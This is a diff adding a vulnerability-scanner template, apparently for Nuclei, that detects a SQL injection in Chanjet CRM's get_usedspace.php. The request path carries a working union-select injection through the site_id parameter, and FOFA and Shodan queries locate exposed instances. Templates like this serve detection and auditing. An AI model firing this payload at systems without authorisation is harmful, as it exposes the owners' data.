@@ -1,0 +1,35 @@
+http:
+- matchers:
+  - part: body
+    type: word
+    words:
+    - <result>{{md5(num)}}
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/webservice/get_usedspace.php?site_id=-1%20and%201=2%20union%20all%20select%20(md5({{num}}))'
+id: chanjet-crm-sqli
+info:
+  author: luckying1314@139.com
+  classification:
+    cwe-id: CWE-89
+  description: 'SQL injection exists in the Chanjet CRM get_usedspace.php, and sensitive
+    information can be obtained through the vulnerability.
+
+    '
+  metadata:
+    fofa-query: "title=\"\u7545\u6377CRM\""
+    max-request: 1
+    product: chanjet CRM
+    shodan-query: "title:\"\u7545\u6377CRM\""
+    vendor: chanjet
+  name: Chanjet CRM - SQL Injection
+  reference:
+  - https://www.chanjet.com/
+  severity: high
+  tags: sqli,chanjet,crm
+variables:
+  num: '999999999'
